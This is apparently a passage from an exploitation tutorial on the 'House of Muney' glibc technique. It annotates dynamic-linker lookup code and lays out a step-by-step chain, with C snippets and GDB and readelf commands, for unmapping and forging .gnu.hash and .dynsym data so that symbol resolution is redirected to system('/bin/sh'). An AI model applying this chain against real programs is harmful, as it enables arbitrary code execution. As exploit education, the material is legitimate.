+_dl_runtime_resolve_xsavecfinishes register/state preservation and eventually calls
+_dl_fixup, which performs the actual symbol resolution .
+
+Its prototype is declared in
+<dl-fptr.c>at line 324 :
+
+C
+
+extern ElfW(Addr) _dl_fixup (struct link_map *, ElfW(Word)) attribute_hidden;
+
+The implementation lives in
+<dl-runtime.c>at line 52 . Here we'll walk through its internal workflow and annotate the source code of
+_dl_fixupto highlight what really happens under the hood (These comments (
+// ...) are injected explanations, layered on top of the original glibc code (
+/* ... */), to decode the symbol resolution mechanism):
+
+C
+
+/* This function is called through a special trampoline from the PLT the
+   first time each PLT entry is called.  We must perform the relocation
+   specified in the PLT of the given shared object, and return the resolved
+   function address to the trampoline, which will restart the original call
+   to that address.  Future calls will bounce directly from the PLT to the
+   function.  */
+
+DL_FIXUP_VALUE_TYPE
+attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE
+_dl_fixup (
+# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
+	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
+# endif
+       // 1st arg: linkmap l refers to the binary's link_map, extracted from GOT+8
+       // 2nd arg: reloc_arg refers to n in the `push n` instruction from PLT entry
+	   struct link_map *l, ElfW(Word) reloc_arg)
+{
+  // Load .symtab and .strtab from the dynamic segment according to link_map l
+  const ElfW(Sym) *const symtab
+    	= (const void *) D_PTR (l, l_info[DT_SYMTAB]);
+  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
+
+  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);
+
+  // Locate the relocation entry in .rela.plt via reloc_arg (i.e., push n)
+  const PLTREL *const reloc
+    	= (const void *) (D_PTR (l, l_info[DT_JMPREL])
+		      + reloc_offset (pltgot, reloc_arg));
+  // Lookup symbol
+  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
+  const ElfW(Sym) *refsym = sym;
+
+  // Address to be patched (GOT entry) = base address + r_offset
+  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
+  lookup_t result;
+  DL_FIXUP_VALUE_TYPE value;
+
+  /* Sanity check that we're really looking at a PLT relocation.  */
+  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
+
+   /* Look up the target symbol.  If the normal lookup rules are not
+      used don't look in the global scope.  */
+  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
+    // If symbol is not hidden (i.e., globally visible), perform lookup
+    {
+      const struct r_found_version *version = NULL;
+
+      // Handle symbol versioning if applicable
+      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
+        {
+          const ElfW(Half) *vernum =
+            		(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
+          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
+          version = &l->l_versions[ndx];
+          if (version->hash == 0)
+            version = NULL;
+        }
+
+      /* We need to keep the scope around so do some locking.  This is
+	 not necessary for objects which cannot be unloaded or when
+	 we are not using any threads (yet).  */
+      int flags = DL_LOOKUP_ADD_DEPENDENCY;
+      // Prepare flags for thread safety and dependency tracking
+      if (!RTLD_SINGLE_THREAD_P)
+        {
+          THREAD_GSCOPE_SET_FLAG ();
+          flags |= DL_LOOKUP_GSCOPE_LOCK;
+        }
+
+#ifdef RTLD_ENABLE_FOREIGN_CALL
+      RTLD_ENABLE_FOREIGN_CALL;
+#endif
+
+      // [!] Perform the actual symbol lookup across loaded link maps
+      // 1st arg: the Symbol Name String, retrieved from the symbol table and string table
+      // 2nd arg: the link_map of the current object
+      // 3rd arg: a pointer to the symbol entry (on the stack); it will be updated with the resolved symbol
+      // 4th arg: the scope list defines the range of shared objects to search through
+      // 5th arg: version information (if applicable)
+      // The remaining arguments are fixed; They control how the lookup is performed
+      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
+				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+
+      /* We are done with the global scope.  */
+      if (!RTLD_SINGLE_THREAD_P)
+	THREAD_GSCOPE_RESET_FLAG ();
+
+#ifdef RTLD_FINALIZE_FOREIGN_CALL
+      RTLD_FINALIZE_FOREIGN_CALL;
+#endif
+
+      /* Currently result contains the base load address (or link map)
+	 of the object that defines sym.  Now add in the symbol
+	 offset.  */
+      value = DL_FIXUP_MAKE_VALUE (result,
+				   SYMBOL_ADDRESS (result, sym, false));
+    }
+  else
+    {
+      /* We already found the symbol.  The module (and therefore its load
+	 address) is also known.  */
+      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
+      result = l;
+    }
+
+  /* And now perhaps the relocation addend.  */
+  value = elf_machine_plt_value (l, reloc, value);	// Apply architecture-specific offset fixups, if needed
+
+  // Handle IFUNC (indirect functions that return code pointers dynamically)
+  if (sym != NULL
+      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
+    	value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
+
+// If auditing is enabled (e.g., via `LD_AUDIT`), hook into binding
+#ifdef SHARED
+  /* Auditing checkpoint: we have a new binding.  Provide the auditing
+     libraries the possibility to change the value and tell us whether further
+     auditing is wanted.
+     The l_reloc_result is only allocated if there is an audit module which
+     provides a la_symbind.  */
+  if (l->l_reloc_result != NULL)
+    {
+      /* This is the address in the array where we store the result of previous
+	 relocations.  */
+      struct reloc_result *reloc_result
+			= &l->l_reloc_result[reloc_index (pltgot, reloc_arg, sizeof (PLTREL))];
+      unsigned int init = atomic_load_acquire (&reloc_result->init);
+      if (init == 0)
+        {
+          _dl_audit_symbind (l, reloc_result, reloc, sym, &value, result, true);
+
+          /* Store the result for later runs.  */
+          if (__glibc_likely (! GLRO(dl_bind_not)))
+            // Finally, patch the GOT slot with the resolved address
+            {
+              reloc_result->addr = value;
+              /* Guarantee all previous writes complete before init is
+             updated.  See CONCURRENCY NOTES below.  */
+              atomic_store_release (&reloc_result->init, 1);
+            }
+        }
+      else
+        {
+		value = reloc_result->addr;
+    	}
+#endif
+
+  /* Finally, fix up the plt itself.  */
+  if (__glibc_unlikely (GLRO(dl_bind_not)))
+    return value;
+
+  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
+}
+
+This function represents the core of glibc's lazy binding logic . It extracts symbol metadata from relocation tables, performs lookup through
+_dl_lookup_symbol_x, computes the final symbol address, and patches the GOT entry — completing the lazy-binding cycle.
+
+_dl_lookup_symbol_x
+
+The
+_dl_lookup_symbol_xfunction is responsible for locating a symbol definition during runtime resolution. It's declared in
+<ldsodefs.h>at line 938 :
+
+C
+
+/* Lookup versioned symbol.  */
+extern lookup_t _dl_lookup_symbol_x (const char *undef,
+				     struct link_map *undef_map,
+				     const ElfW(Sym) **sym,
+				     struct r_scope_elem *symbol_scope[],
+				     const struct r_found_version *version,
+				     int type_class, int flags,
+				     struct link_map *skip_map)
+     attribute_hidden;
+
+This function resolves a symbol name (
+undef) to its address by scanning a list of shared objects (
+symbol_scope) for a matching definition, defined in
+<dl-lookup.c>at line 829 :
+
+C
+
+/* Search loaded objects' symbol tables for a definition of the symbol
+   UNDEF_NAME, perhaps with a requested version for the symbol.
+
+   We must never have calls to the audit functions inside this function
+   or in any function which gets called.  If this would happen the audit
+   code might create a thread which can throw off all the scope locking.  */
+lookup_t
+_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,
+		     const ElfW(Sym) **ref,
+		     struct r_scope_elem *symbol_scope[],
+		     const struct r_found_version *version,
+		     int type_class, int flags, struct link_map *skip_map)
+{
+  // Compute GNU hash for the undefined symbol
+  const unsigned int new_hash = _dl_new_hash (undef_name);
+  unsigned long int old_hash = 0xffffffff;
+
+  // Store the result of this lookup
+  struct sym_val current_value = { NULL, NULL };
+  struct r_scope_elem **scope = symbol_scope;
+
+  bump_num_relocations ();
+
+  /* DL_LOOKUP_RETURN_NEWEST does not make sense for versioned
+     lookups.  */
+  assert (version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST));
+
+  size_t i = 0;
+
+  // If skip_map is set, skip over it in the search scope
+  if (__glibc_unlikely (skip_map != NULL))
+    /* Search the relevant loaded objects for a definition.  */
+    while ((*scope)->r_list[i] != skip_map)
+      ++i;
+
+  /* Search the relevant loaded objects for a definition.  */
+  for (size_t start = i; *scope != NULL; start = 0, ++scope)
+    // [!] Walk through scope elements (shared objects) and search
+    // via the inner core do_lookup_x
+    if (do_lookup_x (undef_name, new_hash, &old_hash, *ref,
+		     &current_value, *scope, start, version, flags,
+		     skip_map, type_class, undef_map) != 0)
+      break;
+
+  if (__glibc_unlikely (current_value.s == NULL))
+    {
+      if ((*ref == NULL || ELFW(ST_BIND) ((*ref)->st_info) != STB_WEAK)
+	  && !(GLRO(dl_debug_mask) & DL_DEBUG_UNUSED))
+        {
+          /* We could find no value for a strong reference.  */
+          const char *reference_name = undef_map ? undef_map->l_name : "";
+          const char *versionstr = version ? ", version " : "";
+          const char *versionname = (version && version->name
+                         ? version->name : "");
+          struct dl_exception exception;
+          /* XXX We cannot translate the message.  */
+          _dl_exception_create_format
+            (&exception, DSO_FILENAME (reference_name),
+             "undefined symbol: %s%s%s",
+             undef_name, versionstr, versionname);
+          _dl_signal_cexception (0, &exception, N_("symbol lookup error"));
+          _dl_exception_free (&exception);
+        }
+      *ref = NULL;
+      return 0;
+  }
+
+  // Handle STV_PROTECTED visibility
+  int protected = (*ref
+		   && ELFW(ST_VISIBILITY) ((*ref)->st_other) == STV_PROTECTED);
+  if (__glibc_unlikely (protected != 0))
+        {
+          /* It is very tricky.  We need to figure out what value to
+         return for the protected symbol.  */
+          if (type_class == ELF_RTYPE_CLASS_PLT)
+            {
+              if (current_value.s != NULL && current_value.m != undef_map)
+                {
+                  current_value.s = *ref;
+                  current_value.m = undef_map;
+                }
+            }
+      else
+        {
+          // For non-PLT (e.g., data), re-resolve with visibility logic
+          struct sym_val protected_value = { NULL, NULL };
+
+          for (scope = symbol_scope; *scope != NULL; i = 0, ++scope)
+            // [!] Call the internal core do_lookup_x to resolve
+            if (do_lookup_x (undef_name, new_hash, &old_hash, *ref,
+                     &protected_value, *scope, i, version, flags,
+                     skip_map,
+                     (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA
+                      && ELFW(ST_TYPE) ((*ref)->st_info) == STT_OBJECT
+                      && type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA)
+                     ? ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA
+                     : ELF_RTYPE_CLASS_PLT, NULL) != 0)
+              break;
+
+          if (protected_value.s != NULL && protected_value.m != undef_map)
+            {
+              current_value.s = *ref;
+              current_value.m = undef_map;
+            }
+        }
+    }
+
+  /* We have to check whether this would bind UNDEF_MAP to an object
+     in the global scope which was dynamically loaded.  In this case
+     we have to prevent the latter from being unloaded unless the
+     UNDEF_MAP object is also unloaded.  */
+  if (__glibc_unlikely (current_value.m->l_type == lt_loaded)
+      /* Don't do this for explicit lookups as opposed to implicit
+	 runtime lookups.  */
+      && (flags & DL_LOOKUP_ADD_DEPENDENCY) != 0
+      /* Add UNDEF_MAP to the dependencies.  */
+      && add_dependency (undef_map, current_value.m, flags) < 0)
+      /* Something went wrong.  Perhaps the object we tried to reference
+	 was just removed.  Try finding another definition.  */
+      return _dl_lookup_symbol_x (undef_name, undef_map, ref,
+				  (flags & DL_LOOKUP_GSCOPE_LOCK)
+				  ? undef_map->l_scope : symbol_scope,
+				  version, type_class, flags, skip_map);
+
+  /* The object is used.  */
+  if (__glibc_unlikely (current_value.m->l_used == 0))
+    	current_value.m->l_used = 1;
+
+  // Debug output if DL_DEBUG_BINDINGS enabled
+  if (__glibc_unlikely (current_value.m->l_used == 0))
+    	current_value.m->l_used = 1;
+
+  if (__glibc_unlikely (GLRO(dl_debug_mask)
+			& (DL_DEBUG_BINDINGS|DL_DEBUG_PRELINK)))
+    	_dl_debug_bindings (undef_name, undef_map, ref,
+			&current_value, version, type_class, protected);
+
+  *ref = current_value.s;	// Store the resolved symbol
+  return LOOKUP_VALUE (current_value.m);	// Return associated link_map
+}
+
+Internally, it dispatches to
+do_lookup_x, scanning the scope list until the symbol is found or lookup fails.
+
+do_lookup_x
+
+The called
+do_lookup_xis the internal core engine for symbol resolution, defined in the same
+<dl-lookup.cfile from line 358 :
+
+C
+
+/* Inner part of the lookup functions.  We return a value > 0 if we
+   found the symbol, the value 0 if nothing is found and < 0 if
+   something bad happened.  */
+static int
+__attribute_noinline__
+do_lookup_x (const char *undef_name, unsigned int new_hash,
+	     unsigned long int *old_hash, const ElfW(Sym) *ref,
+	     struct sym_val *result, struct r_scope_elem *scope, size_t i,
+	     const struct r_found_version *const version, int flags,
+	     struct link_map *skip, int type_class, struct link_map *undef_map)
+{
+  size_t n = scope->r_nlist;
+  /* Make sure we read the value before proceeding.  Otherwise we
+     might use r_list pointing to the initial scope and r_nlist being
+     the value after a resize.  That is the only path in dl-open.c not
+     protected by GSCOPE.  A read barrier here might be to expensive.  */
+  __asm volatile ("" : "+r" (n), "+m" (scope->r_list));
+  struct link_map **list = scope->r_list;
+
+  do
+    {
+      const struct link_map *map = list[i]->l_real;
+
+      /* Here come the extra test needed for `_dl_lookup_symbol_skip'.  */
+      if (map == skip)
+		continue;
+
+      /* Don't search the executable when resolving a copy reloc.  */
+      if ((type_class & ELF_RTYPE_CLASS_COPY) && map->l_type == lt_executable)
+		continue;
+
+      /* Do not look into objects which are going to be removed.  */
+      if (map->l_removed)
+		continue;
+
+      /* Print some debugging info if wanted.  */
+      if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_SYMBOLS))
+		_dl_debug_printf ("symbol=%s;  lookup in file=%s [%lu]\n",
+			  undef_name, DSO_FILENAME (map->l_name),
+			  map->l_ns);
+
+      /* If the hash table is empty there is nothing to do here.  */
+      if (map->l_nbuckets == 0)
+		continue;
+
+      Elf_Symndx symidx;
+      int num_versions = 0;
+      const ElfW(Sym) *versioned_sym = NULL;
+
+      /* The tables for this map.  */
+      // [!] Retrieve symbol and string tables, from the current link_map
+      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);
+      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);
+
+      const ElfW(Sym) *sym;
+
+      // GNU-style hash lookup (faster and more common in modern ELF)
+      // Retrive bitmask
+      const ElfW(Addr) *bitmask = map->l_gnu_bitmask;
+      if (__glibc_likely (bitmask != NULL))
+        {
+          // Retrive bitmask_word
+          // [!] Hijack: Forge bitmask_word
+          ElfW(Addr) bitmask_word
+            = bitmask[(new_hash / __ELF_NATIVE_CLASS)
+                  	& map->l_gnu_bitmask_idxbits];
+
+          // Compute bit positions to test in bitmask
+          unsigned int hashbit1 = new_hash & (__ELF_NATIVE_CLASS - 1);
+          unsigned int hashbit2 = ((new_hash >> map->l_gnu_shift)
+                       				& (__ELF_NATIVE_CLASS - 1));
+
+          // Use two-way bitmask test for potential match
+          if (__glibc_unlikely ((bitmask_word >> hashbit1)
+                    & (bitmask_word >> hashbit2) & 1))
+            {
+              // Retrive bucket
+              // [!] Hijack: Forge bucket
+              Elf32_Word bucket = map->l_gnu_buckets[new_hash
+                                 	% map->l_nbuckets];
+              if (bucket != 0)
+                {
+                  // Retrive hasharr
+                  // [!] Hijack: Forge corresponding value
+                  const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
+
+                  // Walk hash chain until we find a hash that matches new_hash
+                  do
+                    if (((*hasharr ^ new_hash) >> 1) == 0)
+                      {
+                        // Calculate symbol index and lookup actual symbol
+                        symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr);
+                        sym = check_match (undef_name, ref, version, flags,
+                                       type_class, &symtab[symidx], symidx,
+                                       strtab, map, &versioned_sym,
+                                       &num_versions);
+                        if (sym != NULL)
+                          goto found_it;
+                      }
+                  while ((*hasharr++ & 1u) == 0);	// continue until last chain entry
+                }
+            }
+          /* No symbol found.  */
+          symidx = SHN_UNDEF;
+        }
+      else
+        {
+          if (*old_hash == 0xffffffff)
+            *old_hash = _dl_elf_hash (undef_name);
+
+          /* Use the old SysV-style hash table.  Search the appropriate
+             hash bucket in this object's symbol table for a definition
+             for the same symbol name.  */
+
+          [...]
+}
+
+The exploitable areas when we do House of Muney :
+
+Element Description Exploit Potential
+bitmask_word Entry into the bloom filter Forge this value to pass the dual-bit check and trigger fake symbol chain lookup
+bucket Index into the hash chain list Redirect to a forged entry in l_gnu_chain_zero to initiate a fake chain
+hasharr Actual chained hash values Craft matching hash values to pass the check ((hasharr ^ new_hash) >> 1 == 0)
+The hijack strategy behind House of Muney : bypass the bloom filter with
+bitmask_word, redirect resolution flow via
+bucket, and walk a fake hash chain (
+hasharr) into attacker-controlled
+symtab/strtabentries.
+
+Attack Chain
+
+The House of Muney exploit targets the glibc symbol resolution mechanism by abusing how
+mmapallocates large chunks of memory. When
+ptmallocis asked to allocate memory larger than
+0x20000(128 KB), it bypasses the heap and invokes
+mmap, which often places the new mapping in low memory addresses — right below or adjacent to the glibc mappings , including
+.dynsym,
+.dynstr, and the GNU hash tables.
+
+The key idea is to mmap over glibc's internal structures , reclaim that memory space, and forge critical symbol resolution data — specifically, symbol resolution metadata like
+.dynsym,
+.dynstr, and
+.gnu.hash, the GNU hash tables.
+
+The process goes like this:
+
+1. Initial mmap Allocation
+
+Allocate a small
+mmap-based chunk near libc mappings:
+
+C
+
+void *victim = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+This lands in low memory, typically just beneath
+libc.so.6(we will inspect details in the following debugging section).
+
+2. Fake Size Expansion
+
+Corrupt
+victim's metadata (e.g., via overflow from a neighboring chunk) to inflate its internal size :
+
+C
+
+victim->size = 0x1000 + X;  // X must be large enough to reach .dynsym/.gnu.hash/etc.
+
+This convinces
+munmapto unmap more memory than originally allocated.
+
+3. Free the Mapping
+
+Free the corrupted chunk:
+
+C
+
+free(victim);  // Internally: munmap(A, A->size);
+
+Because
+victim->sizeis forged, this can unmap glibc's symbol resolution structures , including:
+.dynsym,
+.dynstr,
+.gnu.hash,
+.symtab,
+.strtaband even
+.got.
+
+4. Reclaim the Region
+
+Immediately
+mmap()again with the same
+0x1000 + Xsize:
+
+C
+
+void *fake = mmap(NULL, 0x1000 + X, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+The kernel will reuse the same address range just unmapped.
+
+5. Forge glibc Structures
+
+Once the
+.gnu.hash,
+.dynsym, and
+.dynstrmemory regions are unmapped and reclaimed via
+mmap, we now have full control over glibc's dynamic linking metadata . To hijack symbol resolution, we forge the following internal structures:
+
+a) Bloom Filter
+
+l_gnu_bitmask(
+bitmask_word) is the so called bloom filter, which is located in the ELF's
+.gnu.hashsection and accessed via
+link_map->l_gnu_bitmask. It acts as a quick pre-filter for symbol candidates. Glibc checks two bits in the
+bitmask_wordcorresponding to a given
+new_hash.
+
+By forging a
+bitmask_wordwith the required bits set , we pass this check:
+
+C
+
+if ((bitmask_word >> hashbit1) & (bitmask_word >> hashbit2) & 1)
+
+To exploit, we need to set:
+
+C
+
+*(Elf64_Addr *)(reclaimed_mem + bitmask_word_offset) = forged_bitmask_word;
+
+Set it to something like
+0xffffffffffffffffto pass any two-bit check.
+
+b) Bucket Table
+
+l_gnu_bucketsis the so called bucket table, which is an array of
+Elf32_Word, accessed via
+link_map->l_gnu_buckets. It maps
+new_hash % nbucketsto a symbol index into
+l_gnu_chain_zero[].
+
+Our goal is to control this index to point into the fake hasharr chain . For example:
+
+C
+
+*(Elf32_Word *)(reclaimed_mem + bucket_offset) = forged_index;
+
+This value should match the offset of our hash entry inside
+l_gnu_chain_zero.
+
+c) Hash Chain Table
+
+l_gnu_chain_zerofrom
+.gnu.hashsection, where our target
+hasharris a member inside it, is the so called hash chain table. It is an array of
+Elf32_Word, accessed as:
+
+C
+
+hasharr = &link_map->l_gnu_chain_zero[bucket]
+
+In glibc implementation, there's a hash chain to check whether the symbol hash matches :
+
+C
+
+if (((*hasharr ^ new_hash) >> 1) == 0)
+
+To exploit this, we need to forge a
+hasharr[i]value such that:
+
+C
+
+(*hasharr ^ new_hash) >> 1 == 0
+
+=> Which means:
+
+C
+
+*hasharr == new_hash
+
+Write:
+
+C
+
+*(Elf32_Word *)(reclaimed_mem + hasharr_offset) = new_hash;
+
+We'll typically brute-force a hash (or reverse
+dl_new_hash) for the symbol name we want (e.g.,
+"exit"or
+"printf").
+
+d) Sym Table
+
+The
+.dymsymtable is an
+Elf64_Symarray accessed via
+link_map->l_info[DT_SYMTAB].
+
+Each entry:
+
+C
+
+typedef struct {
+  Elf64_Word st_name;
+  unsigned char st_info;
+  unsigned char st_other;
+  Elf64_Half st_shndx;
+  Elf64_Addr st_value;
+  Elf64_Xword st_size;
+} Elf64_Sym;
+
+As earlier introduced, it describes symbols (name index, value, etc.).
+
+To exploit, we forge a symbol with:
+
+st_name: offset into our fake string table
+
+st_value: target function address (e.g.,
+system())
+
+For example:
+
+C
+
+Elf64_Sym fake_sym = {
+  .st_name = 0xdead,                  // offset into forged strtab
+  .st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
+  .st_other = 0,
+  .st_shndx = SHN_UNDEF,
+  .st_value = system_offset           // offset to hijack call
+};
+
+Then write
+fake_syminto:
+
+C
+
+*(Elf64_Sym *)(reclaimed_mem + symtab_offset) = fake_sym;
+
+e) String Table
+
+The
+.dynstrTable is accessed via
+link_map->l_info[DT_STRTAB]. It stores symbol names used by dynamic linking (e.g.,
+"exit",
+"puts")
+
+To exploit, we provide a valid symbol name string that matches what the program tries to resolve.
+
+Write:
+
+C
+
+strcpy(reclaimed_mem + strtab_offset + 0xdead, "exit");
+
+Ensure that
+st_namefrom the fake symbol above indexes into this correctly.
+
+This is not necessary in an exploit.
+
+In House of Muney, we can reuse an existing symbol , for example
+"exit"— a real symbol already present in the ELF's
+.dynsymtable with a valid
+st_namefield pointing to a string inside
+.dynstr.
+
+So, instead of inventing a new symbol, we can locate the existing symbol entry (e.g.,
+exit) and overwrites just the
+st_valuefield to point to target functions like
+system. The string
+"exit"is still used as-is—no new name needed, no need to modify
+.dynstr.
+
+Once forged, any function using the lazy PLT stub (like
+exit()or
+puts()) will resolve through our fake metadata, effectively redirecting the call to any arbitrary function (e.g.,
+system("/bin/sh")).
+
+6. Trigger Symbol Resolution
+
+Any subsequent function call (e.g.,
+puts(),
+printf(), etc.) that passes through the lazy PLT binding mechanism will call:
+
+_dl_runtime_resolve
+         └───► _dl_fixup
+                    └───► _dl_lookup_symbol_x
+                               └───► do_lookup_x
+
+This sequence walks the forged
+.gnu.hashtable, retrieves a fake symbol, and jumps to a controlled
+st_value— arbitrary code execution.
+
+Look Inside
+
+House of Muney sidesteps the need for leaking libc or heap addresses altogether. However, the offsets of critical targets are version-specific , shifting subtly across glibc releases. To weaponize the exploit reliably, we need to dissect the internal mappings—particularly the intricate
+.gnu.hashand
+.dynsymsections.
+
+These regions govern symbol lookup and validation, and understanding their layout allows us to:
+
+Pinpoint the offsets of key variables used in resolution logic
+
+Replicate or bypass integrity checks by mimicking valid structures
+
+Preserve execution stability , avoiding crashes during symbol lookup or relocation fixups
+
+This reconnaissance phase is essential: precision offsets, accurate data reproduction, and surgical corruption for a clean, controlled subversion.
+
+Libc Offsets
+
+Though House of Muney avoids leaking libc or heap addresses at runtime, its targets within
+libc.so.6still reside at fixed offsets relative to the mmapped region that backs libc—typically right at or near the start of the mapping. These offsets are version-dependent , and even minor glibc updates can shift them.
+
+For reliable PoC validation across multiple glibc versions, it's better to treat these offsets as known constants in the PoC, even if in a real exploit we'd resolve them dynamically or via memory inspection. The variability in libc internals and mmap layout randomness across systems means hardcoded offsets won't be portable without verification.
+
+To adapt and verify PoCs under these changing conditions, we can leak a stable GOT entry—such as
+puts—then use symbol table inspection to calculate precise offsets from the libc base:
+
+Bash
+
+readelf -s libc.so.6 | grep ' puts'
+readelf -s libc.so.6 | grep ' system'
+readelf -s libc.so.6 | grep ' exit'
+
+Dynsym Offsets
+
+_r_debug
+
+Upon loading shared objects, glibc's dynamic linker (
+ld.so) sets up an internal control structure known as
+_r_debug. This isn't just for debuggers—glibc itself uses it to:
+
+Track loaded shared libraries via a linked list of
+link_mapentries
+
+Record the base address of each loaded object
+
+Maintain access to symbol tables, relocation tables, and versioning info
+
+_r_debuglives in the
+.dynsymscope and is pointed to by the
+DT_DEBUGentry within the
+.dynamicsection—though it's only populated after the dynamic linker finishes relocation .
+
+For exploitation, especially when manipulating or forging resolution logic (as in House of Muney ), understanding
+_r_debugand its embedded
+link_mapchain is vital. It becomes a navigation map to the entire dynamic linking universe at runtime.
+
+It is used for things like breakpoints during
+dlopen,
+RT_CONSISTENTchecks, and relocation updates , declared in
+<link.h>:
+
+C
+
+struct r_debug {
+  int r_version;
+  struct link_map *r_map;  // Linked list of all loaded ELF objects
+  ElfW(Addr) r_brk;
+  enum { RT_CONSISTENT, RT_ADD, RT_DELETE } r_state;
+  ElfW(Addr) r_ldbase;
+};
+
+r_map
+
+Within
+_r_debug, the key field of interest is
+r_map—a pointer to the head of a linked list of loaded shared objects , each represented by a
+struct link_map.
+
+To retrieve it in GDB:
+
+// GDB commands
+set $r = (struct r_debug *)&_r_debug
+p $r->r_map
+
+This gives us a handle to the dynamic loader's view of the runtime library map . Each node in the list is a
+link_mapstructure, representing one loaded object.
+
+Once we have the head of the list (it's a pointer to the first library — usually the main binary or the dynamic loader ), we can inspect it like so:
+
+// GDB commands
+set $m = (struct link_map *)$r->r_map
+p (char *)$m->l_name
+p (char *)$m->l_next->l_name
+p (char *)$m->l_next->l_next->l_name
+
+We can walk through the full linked list of
+struct link_mapentries from
+_r_debug.r_mapto find the libc
+link_map, with the
+l_nextpointer. Usually:
+
+1st map: The main binary (empty
+l_name)
+
+2nd map: The
+ld.sodynamic loader
+
+3rd map: The
+libc.so.6
+
+4th map: Internal rtld structure (
+_rtld_global)
+
+5th map: NULL (end of linked list) — depends on different binaries
+
+Here, we access
+l_nameto retrieve the name associated with the current
+r_mapentry. By following the
+l_nextpointer, we iterate through the linked list of shared objects. Once we encounter the one whose
+l_namecontains
+"libc.so.6"(or a versioned equivalent), we can safely assign:
+
+// GDB commands
+set $libc = $m->l_next->l_next  // Adjust based on env
+
+This marks the libc's
+link_map, the structure the dynamic linker uses internally for symbol resolution. It becomes our primary interface for extracting or forging resolution metadata , including access to:
+
+l_addr: base address of libc
+
+l_info[]: pointers to dynamic section entries (like
+DT_SYMTAB,
+DT_STRTAB,
+DT_JMPREL)
+
+l_next: pointer to the next loaded object
+
+This step is critical in House of Muney —knowing which
+link_mapentry corresponds to libc allows us to simulate or hijack glibc's resolution logic with surgical precision.
+
+l_info[]
+
+In glibc's dynamic linker,
+l_info[]acts as an indexable lookup table for critical dynamic section entries. It maps dynamic tags (like
+DT_SYMTAB,
+DT_STRTAB,
+DT_JMPREL, etc.) to their corresponding
+Elf64_Dynstructures within the binary's
+DYNAMICsegment.
+
+To access this from GDB:
+
+// GDB commands
+set $m = (struct link_map *)((struct r_debug *)&_r_debug)->r_map
+set $libc = $m->l_next->l_next
+p/x $libc->l_info[DT_SYMTAB]->d_un.d_ptr
+
+This prints the virtual address of the
+.dynsymsection — the dynamic symbol table — by resolving
+d_un.d_ptrfrom the dynamic entry. These dynamic entries are laid out as aforementioned:
+
+C
+
+typedef struct {
+	Elf64_Sxword	d_tag;
+   	union {
+   		Elf64_Xword	d_val;
+   		Elf64_Addr	d_ptr;
+	} d_un;
+} Elf64_Dyn;
+
+Each
+l_info[DT_*]entry directly maps to a corresponding tag in the
+.dynamicsection. For example ( Anchor: SYMTAB table ):
+
+DT_SYMTAB(
+6) →
+.dynsym
+
+DT_STRTAB(
+5) →
+.dynstr
+
+Accessing
+l_info[]gives us direct insight into the resolved memory layout of dynamic ELF internals . And for exploitation, this is the gold vein: it gives us exact in-memory locations of all symbol resolution infrastructure.
+
+.dynsym
+
+Therefore,
+l_info[6]points to the base of the
+.dynsymsection, which is structured as an array of
+Elf64_Symentries. We can assign the symbol table base like so:
+
+// GDB commands
+set $dynsym = (Elf64_Sym *)$libc->l_info[6]->d_un.d_ptr
+
+While
+l_info[5]points to the corresponding string table base (
+.dynstr):
+
+// GDB commands
+set $dynstr = (Elf64_Sym *)$libc->l_info[5]->d_un.d_ptr
+
+Each
+Elf64_Symis exactly
+0x18bytes:
+
+pwndbg> ptype /o $dynsym
+type = struct {
+/*      0      |       4 */    Elf64_Word st_name;		  // Offset in .dynstr
+/*      4      |       1 */    unsigned char st_info;	  // Symbol type and binding
+/*      5      |       1 */    unsigned char st_other;	// Visibility
+/*      6      |       2 */    Elf64_Section st_shndx;	// Section index
+/*      8      |       8 */    Elf64_Addr st_value;		  // Resolved address (Hijack in exploit)
+/*     16      |       8 */    Elf64_Xword st_size;		  // Size of the object (usually 0 for funcs like exit)
+
+                    	/* total size (bytes):   24 */
+                    } *
+
+This structure contains the full metadata for a symbol. To locate a target like
+exit, use
+readelfto get its symbol index :
+
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | head -n4 && \
+  readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' exit@@'
+
+Symbol table '.dynsym' contains 2370 entries:
+Num:    Value          Size Type    Bind   Vis      Ndx Name
+  0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+Now, assign the symbol:
+
+// GDB commands
+set $exit_index = 135
+set $exit_sym = $dynsym + $exit_index
